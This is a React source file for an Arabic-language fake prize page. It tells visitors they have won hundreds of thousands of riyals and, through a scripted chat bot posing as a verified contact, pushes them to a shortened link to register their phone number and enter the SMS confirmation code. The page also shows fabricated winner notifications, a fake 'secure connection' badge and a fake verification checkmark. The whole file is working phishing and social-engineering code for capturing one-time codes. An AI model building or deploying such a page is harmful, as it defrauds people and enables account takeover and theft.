import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Gift, Phone, CheckCircle, Bell, ShieldCheck, MessageCircle, X, Send, Lock } from 'lucide-react';

export default function App() {
  const prizes = ["350,000", "400,000", "500,000", "750,000", "1,000,000", "1,500,000"];
  const [prize, setPrize] = useState("");
  
  const names = ["محمد", "أحمد", "علي", "فاطمة", "محمود", "يوسف", "خالد", "عمر", "سارة", "نورة", "عبدالله", "سلمان", "فيصل", "سعود", "عبدالرحمن", "وليد", "تركي", "فهد"];
  const countries = ["السعودية", "الإمارات", "الكويت", "قطر", "عمان", "البحرين"];
  const notificationPrizes = ["350,000", "400,000", "500,000", "750,000"];

  interface Notification {
    id: number;
    name: string;
    country: string;
    amount: string;
  }

  interface Message {
    id: number;
    text: string;
    time: string;
    sender: 'bot' | 'user';
  }

  const [currentNotification, setCurrentNotification] = useState<Notification | null>(null);
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [messages, setMessages] = useState<Message[]>([]);
  const [isTyping, setIsTyping] = useState(false);
  const [showLinkButton, setShowLinkButton] = useState(false);
  const [inputValue, setInputValue] = useState("");
  
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const simulationStarted = useRef(false);

  const profileImage = "https://scontent.fcai19-5.fna.fbcdn.net/v/t39.30808-6/642736220_1463136162066263_1394146826540422364_n.jpg?_nc_cat=105&ccb=1-7&_nc_sid=1d70fc&_nc_ohc=njCy6LQeM64Q7kNvwEsQfGN&_nc_oc=AdmMhuJ3GMjshh-VOZqszbPwOPE0rG8nB7vshTSVsRuPdZgNK_NpOggeJil1NdvaxTw&_nc_zt=23&_nc_ht=scontent.fcai19-5.fna&_nc_gid=7w9mDMsRuDHMZUEJR2Yh4Q&_nc_ss=8&oh=00_Afz6l2cRM8I4EEELVsHOoK3yXA7wm50I0667_X5Un1nG6A&oe=69B373C7";

  const getCurrentTime = () => {
    return new Date().toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
  };

  useEffect(() => {
    setPrize(prizes[Math.floor(Math.random() * prizes.length)]);
  }, []);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, isTyping, showLinkButton]);

  useEffect(() => {
    if (!isChatOpen || !prize || simulationStarted.current) return;
    simulationStarted.current = true;

    const runChat = async () => {
      const addMsg = async (text: string, delay: number) => {
        setIsTyping(true);
        await new Promise(r => setTimeout(r, delay));
        setIsTyping(false);
        setMessages(prev => [...prev, { id: Date.now(), text, time: getCurrentTime(), sender: 'bot' }]);
        await new Promise(r => setTimeout(r, 400));
      };

      await new Promise(r => setTimeout(r, 500));
      await addMsg("السلام عليكم ورحمة الله وبركاته ✋", 800);
      await addMsg(`ألف مبروك! يسعدني أن أبلغك بأنه تم اختيارك عشوائياً من ضمن الفائزين المحظوظين بجائزة نقدية كبرى بقيمة ${prize} ريال سعودي 🎉`, 1500);
      await addMsg("لاستلام الجائزة في حسابك البنكي، يرجى اتباع خطوات بسيطة وموثقة:", 1000);
      await addMsg("1️⃣ اضغط على الرابط بالأسفل.\n2️⃣ قم بتسجيل رقم جوالك بشكل صحيح.\n3️⃣ أدخل رمز التأكيد (SMS) الذي سيصلك لتأكيد هويتك.\n\nبعد التأكيد سيتم تحويل المبلغ فوراً.", 2000);
      
      setIsTyping(true);
      await new Promise(r => setTimeout(r, 800));
      setIsTyping(false);
      setShowLinkButton(true);
    };

    runChat();
  }, [isChatOpen, prize]);

  const handleSendMessage = async (e?: React.FormEvent) => {
    e?.preventDefault();
    if (!inputValue.trim()) return;

    const userMsg = inputValue;
    setInputValue("");
    setMessages(prev => [...prev, { id: Date.now(), text: userMsg, time: getCurrentTime(), sender: 'user' }]);

    setIsTyping(true);
    await new Promise(r => setTimeout(r, 1200));
    setIsTyping(false);

    const replyText = "عزيزي الفائز، يرجى اتباع الخطوات عبر الرابط أدناه لتأكيد هويتك واستلام الجائزة فوراً.";
    setMessages(prev => [...prev, { id: Date.now(), text: replyText, time: getCurrentTime(), sender: 'bot' }]);
    setShowLinkButton(true);
  };

  useEffect(() => {
    const showRandomNotification = () => {
      setCurrentNotification({
        id: Date.now(),
        name: names[Math.floor(Math.random() * names.length)],
        country: countries[Math.floor(Math.random() * countries.length)],
        amount: notificationPrizes[Math.floor(Math.random() * notificationPrizes.length)]
      });
      setTimeout(() => setCurrentNotification(null), 4000);
    };

    const initialTimeout = setTimeout(showRandomNotification, 5000);
    const interval = setInterval(showRandomNotification, 12000);
    return () => { clearTimeout(initialTimeout); clearInterval(interval); };
  }, []);

  return (
    <div dir="rtl" className="min-h-screen bg-[#f8fafc] text-slate-800 font-sans overflow-x-hidden pb-24">
      {/* Header */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-40 shadow-sm">
        <div className="max-w-3xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <ShieldCheck className="text-emerald-600 w-6 h-6" />
            <span className="font-bold text-lg text-slate-900">بوابة الجوائز الرسمية</span>
          </div>
          <div className="flex items-center gap-1 text-xs font-semibold text-emerald-600 bg-emerald-50 px-2 py-1 rounded-full border border-emerald-100">
            <Lock className="w-3 h-3" />
            <span>اتصال آمن</span>
          </div>
        </div>
      </header>

      <main className="max-w-xl mx-auto px-4 py-8 flex flex-col items-center">
        {/* Profile Section */}
        <motion.div 
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.5 }}
          className="flex flex-col items-center mb-8"
        >
          <div className="relative mb-4">
            <div className="w-28 h-28 rounded-full p-1 bg-gradient-to-tr from-emerald-400 to-teal-600 shadow-lg">
              <img 
                src={profileImage} 
                alt="ابو ناصر السعودي" 
                className="w-full h-full rounded-full object-cover border-4 border-white"
              />
            </div>
            <div className="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-emerald-100 text-emerald-700 text-[11px] font-bold px-3 py-1 rounded-full border border-emerald-200 flex items-center gap-1.5 shadow-sm whitespace-nowrap">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
              متصل الآن
            </div>
          </div>
          
          <h1 className="text-2xl font-black text-slate-900 flex items-center gap-2">
            ابو ناصر السعودي
            <svg viewBox="0 0 24 24" className="w-5 h-5 text-blue-500 fill-current" aria-label="Verified account">
              <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.9 14.7L6 12.6l1.5-1.5 2.6 2.6 6.4-6.4 1.5 1.5-7.9 7.9z"></path>
            </svg>
          </h1>
        </motion.div>

        {/* Prize Card */}
        <motion.div 
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ duration: 0.5, delay: 0.1 }}
          className="w-full bg-white rounded-3xl p-8 shadow-xl shadow-slate-200/50 border border-slate-100 text-center relative overflow-hidden mb-8"
        >
          <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-emerald-400 to-teal-500"></div>
          
          <h2 className="text-lg font-bold text-slate-600 mb-4">
            تهانينا! لقد تم اختيارك للفوز بجائزة نقدية بقيمة
          </h2>
          
          <div className="mb-6">
            <span className="block text-5xl md:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-r from-emerald-600 to-teal-600">
              {prize} <span className="text-2xl text-emerald-600">ريال</span>
            </span>
          </div>
          
          <p className="text-slate-500 text-sm font-medium mb-8">
            المبلغ جاهز للتحويل إلى حسابك البنكي. يرجى تأكيد هويتك لاستلام الجائزة.
          </p>

          <a 
            href="https://smrturl.co/7e74738"
            className="group relative flex items-center justify-center w-full bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-bold text-xl py-4 rounded-2xl shadow-lg shadow-emerald-500/30 transition-all active:scale-[0.98] gap-2"
          >
            <Gift className="w-6 h-6" />
            استلام الجائزة الآن
          </a>
          
          <div className="mt-4 flex items-center justify-center gap-2 text-xs font-semibold text-slate-400">
            <ShieldCheck className="w-4 h-4 text-emerald-500" />
            <span>معتمد وموثق رسمياً</span>
          </div>
        </motion.div>

        {/* Steps */}
        <motion.div 
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ duration: 0.5, delay: 0.2 }}
          className="w-full"
        >
          <h3 className="text-lg font-bold text-slate-800 mb-6 text-center">خطوات استلام الجائزة</h3>
          
          <div className="space-y-4">
            {[
              { icon: Phone, title: "سجل بياناتك", desc: "اضغط على زر الاستلام وأدخل رقم جوالك." },
              { icon: ShieldCheck, title: "أكد هويتك", desc: "أدخل رمز التأكيد (SMS) المرسل إليك." },
              { icon: CheckCircle, title: "استلم جائزتك", desc: "سيتم تحويل المبلغ فوراً إلى حسابك." }
            ].map((step, i) => (
              <div key={i} className="flex items-center gap-4 bg-white p-4 rounded-2xl border border-slate-100 shadow-sm">
                <div className="w-12 h-12 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center shrink-0">
                  <step.icon className="w-6 h-6" />
                </div>
                <div>
                  <h4 className="font-bold text-slate-800">{step.title}</h4>
                  <p className="text-sm text-slate-500">{step.desc}</p>
                </div>
              </div>
            ))}
          </div>
        </motion.div>
      </main>

      {/* Floating Chat Button */}
      {!isChatOpen && (
        <motion.button
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          whileHover={{ scale: 1.05 }}
          whileTap={{ scale: 0.95 }}
          onClick={() => setIsChatOpen(true)}
          className="fixed bottom-6 right-6 w-16 h-16 bg-[#25D366] text-white rounded-full flex items-center justify-center shadow-xl shadow-green-500/30 z-40"
        >
          <MessageCircle className="w-8 h-8" />
          <span className="absolute top-0 right-0 w-4 h-4 bg-red-500 border-2 border-white rounded-full animate-pulse"></span>
        </motion.button>
      )}

      {/* Live Notifications */}
      <div className="fixed bottom-24 left-0 right-0 z-30 flex justify-center pointer-events-none px-4">
        <AnimatePresence>
          {currentNotification && !isChatOpen && (
            <motion.div
              initial={{ y: 50, opacity: 0, scale: 0.9 }}
              animate={{ y: 0, opacity: 1, scale: 1 }}
              exit={{ y: 20, opacity: 0, scale: 0.9 }}
              className="bg-white border border-slate-200 shadow-xl rounded-2xl p-3 flex items-center gap-3 max-w-sm w-full pointer-events-auto"
            >
              <div className="bg-emerald-100 p-2 rounded-full shrink-0 text-emerald-600">
                <Bell className="w-5 h-5" />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-sm font-bold text-slate-800 truncate">
                  {currentNotification.name} <span className="text-slate-500 font-normal text-xs">من {currentNotification.country}</span>
                </p>
                <p className="text-xs text-slate-600 mt-0.5 truncate">
                  استلم للتو <span className="text-emerald-600 font-bold">{currentNotification.amount} ريال</span>
                </p>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Chat Modal */}
      <AnimatePresence>
        {isChatOpen && (
          <motion.div
            initial={{ y: '100%' }}
            animate={{ y: 0 }}
            exit={{ y: '100%' }}
            transition={{ type: "spring", damping: 25, stiffness: 200 }}
            className="fixed inset-0 z-[100] bg-slate-50 flex flex-col"
          >
            <header className="bg-white border-b border-slate-200 px-4 py-3 flex items-center justify-between shadow-sm shrink-0">
              <div className="flex items-center gap-3">
                <div className="relative">
                  <img src={profileImage} alt="Profile" className="w-10 h-10 rounded-full object-cover border border-slate-200" />
                  <span className="absolute bottom-0 right-0 w-3 h-3 bg-emerald-500 border-2 border-white rounded-full"></span>
                </div>
                <div>
                  <h2 className="text-slate-900 font-bold text-sm flex items-center gap-1">
                    ابو ناصر السعودي
                    <svg viewBox="0 0 24 24" className="w-4 h-4 text-blue-500 fill-current" aria-label="Verified account">
                      <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.9 14.7L6 12.6l1.5-1.5 2.6 2.6 6.4-6.4 1.5 1.5-7.9 7.9z"></path>
                    </svg>
                  </h2>
                  <p className="text-emerald-600 text-[11px] font-medium">
                    {isTyping ? 'يكتب رسالة...' : 'متصل الآن'}
                  </p>
                </div>
              </div>
              <button 
                onClick={() => setIsChatOpen(false)}
                className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-500 hover:bg-slate-200 transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </header>

            <div className="flex-1 overflow-y-auto p-4 flex flex-col gap-4 bg-[#efeae2]">
              <div className="text-center my-2">
                <span className="bg-white/80 text-slate-500 text-[11px] font-medium px-3 py-1 rounded-full shadow-sm">
                  اليوم
                </span>
              </div>

              <AnimatePresence>
                {messages.map((msg) => (
                  <motion.div 
                    key={msg.id}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className={`flex gap-2 items-end ${msg.sender === 'user' ? 'flex-row-reverse' : ''}`}
                  >
                    {msg.sender === 'bot' && (
                      <img src={profileImage} alt="Avatar" className="w-8 h-8 rounded-full object-cover shrink-0 shadow-sm" />
                    )}
                    <div className={`p-3 shadow-sm max-w-[80%] relative ${
                      msg.sender === 'user' 
                        ? 'bg-[#d9fdd3] text-slate-900 rounded-2xl rounded-bl-sm' 
                        : 'bg-white text-slate-900 rounded-2xl rounded-br-sm'
                    }`}>
                      <p className="text-[14px] leading-relaxed whitespace-pre-line">
                        {msg.text}
                      </p>
                      <div className={`flex items-center gap-1 mt-1 ${msg.sender === 'user' ? 'justify-start' : 'justify-end'}`}>
                        <span className="text-[10px] text-slate-500">{msg.time}</span>
                      </div>
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>

              {isTyping && (
                <motion.div 
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0 }}
                  className="flex gap-2 items-end"
                >
                  <img src={profileImage} alt="Avatar" className="w-8 h-8 rounded-full object-cover shrink-0 shadow-sm" />
                  <div className="bg-white rounded-2xl rounded-br-sm px-4 py-3 shadow-sm flex items-center gap-1.5">
                    <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce"></span>
                    <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: '0.15s' }}></span>
                    <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: '0.3s' }}></span>
                  </div>
                </motion.div>
              )}

              {showLinkButton && (
                <motion.div 
                  initial={{ opacity: 0, scale: 0.95, y: 10 }}
                  animate={{ opacity: 1, scale: 1, y: 0 }}
                  className="mt-2 flex justify-center w-full"
                >
                  <div className="w-full max-w-sm bg-white border border-emerald-100 rounded-2xl p-4 shadow-sm text-center">
                    <h3 className="text-xl font-black text-emerald-600 mb-4">
                      {prize} ريال
                    </h3>
                    <a 
                      href="https://smrturl.co/7e74738"
                      className="block w-full bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-3 rounded-xl shadow-sm transition-colors"
                    >
                      اضغط هنا لاستلام الجائزة
                    </a>
                  </div>
                </motion.div>
              )}
              
              <div ref={messagesEndRef} className="h-2" />
            </div>

            <div className="bg-[#f0f2f5] p-3 shrink-0">
              <form onSubmit={handleSendMessage} className="flex items-center gap-2 max-w-2xl mx-auto">
                <input
                  type="text"
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  placeholder="اكتب رسالة..."
                  className="flex-1 bg-white text-slate-900 rounded-full px-4 py-3 outline-none border-none shadow-sm text-sm"
                />
                <button 
                  type="submit"
                  disabled={!inputValue.trim() || isTyping}
                  className="bg-emerald-500 text-white w-11 h-11 rounded-full flex items-center justify-center shrink-0 disabled:opacity-50 transition-colors"
                >
                  <Send className="w-5 h-5 rtl:-scale-x-100" />
                </button>
              </form>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
